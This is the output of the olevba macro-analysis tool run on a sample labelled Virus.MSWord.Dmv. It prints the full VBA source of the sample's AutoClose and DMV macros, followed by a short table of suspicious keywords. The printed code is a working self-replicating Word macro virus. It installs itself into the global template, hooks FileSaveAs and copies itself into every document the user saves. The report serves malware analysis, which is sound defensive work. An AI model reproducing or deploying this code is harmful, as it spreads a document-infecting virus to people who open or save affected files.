olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dmv-9377a72cdee29afb0346518b44aeceab5c552c06
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dmv-9377a72cdee29afb0346518b44aeceab5c552c06 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Dmv-9377a72cdee29afb0346518b44aeceab5c552c06 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim binstalled
Dim bTooMuchTrouble
Dim sMe$
Dim sMacro$
'just to prove another point
On Error GoTo -1: On Error GoTo Abort
iMacroCount = WordBasic.CountMacros(0, 0)
'see we're already installed
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "DMV" Then
        binstalled = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
        bTooMuchTrouble = -1
    End If
Next i
If Not binstalled And Not bTooMuchTrouble Then
    'add FileSaveAs and copies of FileSaveAs and AutoClose
    'DMV is just for more fun
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":DMV"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:DMV"
    WordBasic.MsgBox "               DMV               ", 1
End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO DMV.bas 
in file: Virus.MSWord.Dmv-9377a72cdee29afb0346518b44aeceab5c552c06 - OLE stream: 'Macros/VBA/DMV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'just to prove another point
'this becomes the FileSaveAs for the original template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:DMV", sTMacro$
sTMacro$ = sMe$ + ":DMV"
WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

